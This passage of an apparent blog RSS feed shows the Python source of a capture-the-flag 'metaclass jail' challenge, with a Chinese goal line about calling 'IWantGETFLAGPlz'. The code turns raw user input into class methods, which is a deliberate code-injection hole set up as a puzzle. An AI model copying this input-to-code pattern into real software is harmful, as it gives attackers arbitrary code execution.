+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (attrValue&lt;span style="color:#f92672">.&lt;/span>isalnum()):
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>: 
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">&amp;#39;Illegal value...&amp;#39;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> setattr(cls, attrName, attrValue)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">setMethod&lt;/span>(cls):
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> methodName &lt;span style="color:#f92672">=&lt;/span> setName(&lt;span style="color:#e6db74">&amp;#39;method&amp;#39;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> code &lt;span style="color:#f92672">=&lt;/span> input(&lt;span style="color:#e6db74">f&lt;/span>&lt;span style="color:#e6db74">&amp;#39;Give me your function:&amp;#39;&lt;/span>) 
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> func &lt;span style="color:#f92672">=&lt;/span> createMethod(code)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> setattr(cls, methodName, func)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">getAttribute&lt;/span>(obj):
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> attrs &lt;span style="color:#f92672">=&lt;/span> [attr &lt;span style="color:#66d9ef">for&lt;/span> attr &lt;span style="color:#f92672">in&lt;/span> dir(obj) &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">not&lt;/span> callable(getattr(obj, attr)) &lt;span style="color:#f92672">and&lt;/span> &lt;span style="color:#f92672">not&lt;/span> attr&lt;span style="color:#f92672">.&lt;/span>startswith(&lt;span style="color:#e6db74">&amp;#34;__&amp;#34;&lt;/span>)]
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> x &lt;span style="color:#f92672">=&lt;/span> input(&lt;span style="color:#e6db74">&amp;#39;Please enter the attribute&lt;/span>&lt;span style="color:#ae81ff">\&amp;#39;&lt;/span>&lt;span style="color:#e6db74">s name :&amp;#39;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> x &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#f92672">in&lt;/span> attrs:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">f&lt;/span>&lt;span style="color:#e6db74">&amp;#39;You can&lt;/span>&lt;span style="color:#ae81ff">\&amp;#39;&lt;/span>&lt;span style="color:#e6db74">t access the attribute &lt;/span>&lt;span style="color:#e6db74">{&lt;/span>x&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">f&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#e6db74">{&lt;/span>x&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">: &lt;/span>&lt;span style="color:#e6db74">{&lt;/span>getattr(obj, x)&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">except&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">&amp;#34;Something went wrong in your attribute...&amp;#34;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">callMethod&lt;/span>(cls, obj):
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> attrs &lt;span style="color:#f92672">=&lt;/span> [attr &lt;span style="color:#66d9ef">for&lt;/span> attr &lt;span style="color:#f92672">in&lt;/span> dir(obj) &lt;span style="color:#66d9ef">if&lt;/span> callable(getattr(obj, attr)) &lt;span style="color:#f92672">and&lt;/span> &lt;span style="color:#f92672">not&lt;/span> attr&lt;span style="color:#f92672">.&lt;/span>startswith(&lt;span style="color:#e6db74">&amp;#34;__&amp;#34;&lt;/span>)]
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> x &lt;span style="color:#f92672">=&lt;/span> input(&lt;span style="color:#e6db74">&amp;#39;Please enter the method&lt;/span>&lt;span style="color:#ae81ff">\&amp;#39;&lt;/span>&lt;span style="color:#e6db74">s name :&amp;#39;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> x &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#f92672">in&lt;/span> attrs:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">f&lt;/span>&lt;span style="color:#e6db74">&amp;#39;You can&lt;/span>&lt;span style="color:#ae81ff">\&amp;#39;&lt;/span>&lt;span style="color:#e6db74">t access the method &lt;/span>&lt;span style="color:#e6db74">{&lt;/span>x&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">f&lt;/span>&lt;span style="color:#e6db74">&amp;#39;calling method &lt;/span>&lt;span style="color:#e6db74">{&lt;/span>x&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">...&amp;#39;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> cls&lt;span style="color:#f92672">.&lt;/span>__dict__[x](obj)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">&amp;#39;done&amp;#39;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">except&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">&amp;#39;Something went wrong in your method...&amp;#39;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">Guest&lt;/span>(metaclass &lt;span style="color:#f92672">=&lt;/span> BalsnMetaClass):
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">pass&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> __name__ &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;__main__&amp;#39;&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">f&lt;/span>&lt;span style="color:#e6db74">&amp;#39;Welcome!!We have prepared a class named &amp;#34;Guest&amp;#34; for you&amp;#39;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> cnt &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> cnt &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> cnt &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">&amp;#39;1. Add attribute&amp;#39;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">&amp;#39;2. Add method&amp;#39;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">&amp;#39;3. Finish&amp;#39;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> x &lt;span style="color:#f92672">=&lt;/span> input(&lt;span style="color:#e6db74">&amp;#34;Option ? :&amp;#34;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> x &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#34;1&amp;#34;&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> setAttribute(Guest)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">elif&lt;/span> x &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#34;2&amp;#34;&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> setMethod(Guest)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">elif&lt;/span> x &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#34;3&amp;#34;&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">&amp;#34;invalid input.&amp;#34;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> cnt &lt;span style="color:#f92672">-=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">&amp;#34;Well Done! We Create an instance for you !&amp;#34;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> obj &lt;span style="color:#f92672">=&lt;/span> Guest()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> cnt &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> cnt &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> cnt &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">&amp;#39;1. Inspect attribute&amp;#39;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">&amp;#39;2. Using method&amp;#39;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">&amp;#39;3. Exit&amp;#39;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> x &lt;span style="color:#f92672">=&lt;/span> input(&lt;span style="color:#e6db74">&amp;#34;Option ? :&amp;#34;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> x &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#34;1&amp;#34;&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> getAttribute(obj)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">elif&lt;/span> x &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#34;2&amp;#34;&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> callMethod(Guest, obj)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">elif&lt;/span> x &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#34;3&amp;#34;&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">&amp;#34;Okay...exit...&amp;#34;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">&amp;#34;invalid input.&amp;#34;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> cnt &lt;span style="color:#f92672">-=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="目標">目標&lt;/h3>
+&lt;p>使用MasterMetaClass這個MetaClass建立一個class並調用裡面的IWantGETFLAGPlz func&lt;/p></description></item></channel></rss>
